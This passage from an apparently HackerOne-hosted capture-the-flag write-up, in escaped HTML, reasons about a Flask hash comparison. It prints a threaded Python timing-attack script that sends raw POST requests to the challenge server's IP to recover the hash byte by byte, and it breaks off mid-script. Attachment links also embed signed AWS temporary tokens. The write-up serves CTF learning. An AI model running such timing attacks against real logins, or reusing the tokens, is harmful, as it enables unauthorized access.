isn\u0026#39;t SQLi, and it isn\u0026#39;t cryptographic, then there must be some kind of logical weakness in the server\u0026#39;s app. \u003cstrong\u003eIDEALLY, what would the server\u0026#39;s code look like?\u003c/strong\u003e In my head, I pictured some pseudocode like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif hardcoded_hash == request.get_param(\u0026#39;hash\u0026#39;):\n    authenticate()\nelse:\n    fail()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn that case, the weakness must lie in the comparison itself. Otherwise, the solution to this challenge would have to be something other than a vulnerability in the webapp\u0026#39;s programming. First, I thought of the PHP type juggling comparison bug, where strings starting with \u0026quot;0e\u0026quot; would be coerced to floats, and lead to faulty comparisons. But checking the 404 page quickly dispelled that idea.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"flite2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/488/98bdf54f0f9464f45ad09dba12334cfd8567e39d/flite2.png?response-content-disposition=attachment%3B%20filename%3D%22flite2.png%22%3B%20filename%2A%3DUTF-8%27%27flite2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=536173b24b028f352fc79f1cc11aef150dc9ecf4136863ddeab78ce2b41ac598\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/488/98bdf54f0f9464f45ad09dba12334cfd8567e39d/flite2.png?response-content-disposition=attachment%3B%20filename%3D%22flite2.png%22%3B%20filename%2A%3DUTF-8%27%27flite2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=536173b24b028f352fc79f1cc11aef150dc9ecf4136863ddeab78ce2b41ac598\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis doesn\u0026#39;t look like PHP. This looks like Flask. OK, then. How else could the comparison be weak? Can we leak information about the hardcoded_hash? I was out of any other ideas, so I tried doing a timing attack on the string comparison. This almost never works, but hey, it\u0026#39;s a CTF right? :)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003escipy\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003estats\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003enumpy\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erandom\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ethreading\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003edo_request\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eassert\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e64\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequest_data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u0026quot;POST / HTTP/1.1\nHost: 104.196.12.98\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\n\nhash=\u0026quot;\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eAF_INET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSOCK_STREAM\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;104.196.12.98\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estart_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erequest_data\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eresp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecv\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003estart_time\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eshutdown\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSHUT_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003egenerate_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eprefix\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e%02\u003c/span\u003e\u003cspan class=\"s\"\u003ex\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;00\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003edo_sample\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evalues\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003esample\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003evalues\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mf\"\u003e0.1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egenerate_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edo_request\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003esample\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003eq_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e# if numpy.var(sample) \u0026gt; 0.001:\n\u003c/span\u003e        \u003cspan class=\"c1\"\u003e#   print \u0026#39;This sample is garbage\u0026#39;\n\u003c/span\u003e        \u003cspan class=\"c1\"\u003e#   break\n\u003c/span\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003esample\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003estable_sample\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evalues\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003esample\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edo_sample\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evalues\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003emean\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003enumpy\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003emean\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esample\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003evar\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003enumpy\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esample\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;mu, sigma: \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emean\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003evar\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.001\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Sample variance too high. Try again.\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003esample\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003enum_threads\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003etest_val\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epop_mean\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecands\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eglobal\u003c/span\u003e \u003cspan class=\"n\"\u003enum_threads\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;[*] Testing \u003c/span\u003e\u003cspan class=\"si\"\u003e%02\u003c/span\u003e\u003cspan class=\"s\"\u003ex\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e,)\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e# sample = stable_sample(prefix, [val] * 1)\n\u003c/span\u003e    \u003cspan class=\"n\"\u003esample\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edo_sample\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e])[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003esample\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003epop_mean\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.4\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;[-] Boring (mean close to population)\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e# t, p = stats.ttest_ind(pop_sample, sample)\n\u003c/span\u003e        \u003cspan class=\"c1\"\u003e# print \u0026#39;p =\u0026#39;, p\n\u003c/span\u003e        \u003cspan class=\"c1\"\u003e# if p \u0026lt; 0.001:\n\u003c/span\u003e        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;[+] This is a candidate!\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecands\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e# else:\n\u003c/span\u003e            \u003cspan class=\"c1\"\u003e# print \u0026#39;[-] Boring\u0026#39;\n\u003c/span\u003e    \u003cspan class=\"n\"\u003enum_threads\u003c/span\u003e \u003cspan class=\"o\"\u003e-=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003edo_round\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eto_test\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eglobal\u003c/span\u003e \u003cspan class=\"n\"\u003enum_threads\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e# print \u0026#39;[*] Collecting a population sample\u0026#39;\n\u003c/span\u003e    \u003cspan class=\"c1\"\u003e# pop_sample = stable_sample(prefix, [random.randint(0,255) for i in range(2)])\n\u003c/span\u003e    \u003cspan class=\"n\"\u003epop_mean\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.5\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"mf\"\u003e4.0\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Expecting delay of \u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003ef seconds\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epop_mean\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecands\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eto_test\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"n\"\u003enum_threads\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mf\"\u003e0.1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003enew_thread\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ethreading\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eThread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003etest_val\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epop_mean\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan 